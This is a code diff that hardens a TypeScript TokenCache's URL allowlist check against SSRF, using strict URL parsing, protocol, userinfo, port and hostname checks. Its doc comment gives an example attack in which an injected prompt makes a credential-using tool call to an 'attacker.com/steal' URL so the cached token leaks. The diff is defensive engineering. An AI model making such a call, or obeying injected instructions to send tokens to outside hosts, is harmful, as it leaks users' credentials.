@@ -94,25 +94,53 @@ export class TokenCache {
    * Prevents SSRF: without this check, an injected prompt could craft a
    * cred_use call with url="https://attacker.com/steal?t=..." and the
    * cached token would be sent in the Authorization header.
+   *
+   * Uses the WHATWG URL parser throughout — no raw string matching.
+   * Raw string matching is vulnerable to null bytes, tab characters,
+   * and encoded separators that satisfy startsWith() but confuse fetch().
    */
   isAllowedUrl(service: string, url: string): boolean {
-    // Hard require HTTPS — no exceptions
-    if (!url.startsWith('https://')) return false;
+    // 1. Parse through WHATWG URL parser first.
+    //    This rejects null bytes, control characters, and malformed URLs
+    //    that could pass a naive startsWith() check.
+    let parsed: URL;
+    try {
+      parsed = new URL(url);
+    } catch {
+      return false;
+    }
+
+    // 2. Protocol must be exactly https:
+    if (parsed.protocol !== 'https:') return false;
+
+    // 3. No userinfo (username/password) — rejects the @attacker.com trick
+    //    even when startsWith would still match
+    if (parsed.username || parsed.password) return false;
+
+    // 4. Port must be default HTTPS (empty = 443) or explicit 443.
+    //    Any other port is suspicious and not needed for public APIs.
+    if (parsed.port !== '' && parsed.port !== '443') return false;
+
+    // 5. Normalize hostname to lowercase for case-insensitive comparison
+    const hostname = parsed.hostname.toLowerCase();
 
     if (service === 'salesforce') {
-      // Salesforce: allow *.salesforce.com and *.force.com only
-      try {
-        const { hostname } = new URL(url);
-        return hostname.endsWith('.salesforce.com') || hostname.endsWith('.force.com');
-      } catch {
-        return false;
-      }
+      // Salesforce: allow *.salesforce.com and *.force.com only.
+      // Additionally block hostnames that look like raw IPs to prevent
+      // DNS rebinding via subdomains (e.g. 192.168.1.1.salesforce.com).
+      const isPrivateIpSubdomain = /^(\d{1,3}\.){3}\d{1,3}\./.test(hostname);
+      if (isPrivateIpSubdomain) return false;
+      return hostname.endsWith('.salesforce.com') || hostname.endsWith('.force.com');
     }
 
     const allowed = SERVICE_ALLOWLIST[service];
     if (!allowed) return false;
 
-    return allowed.some(base => url.startsWith(base));
+    // 6. Reconstruct a clean normalized URL from parsed components for allowlist check.
+    //    This avoids matching against the raw string (which may contain control chars
+    //    or encoding tricks that passed the URL parser).
+    const normalizedUrl = `https://${hostname}${parsed.pathname}`;
+    return allowed.some(base => normalizedUrl.startsWith(base));
   }
 
   /** Remove all expired entries */
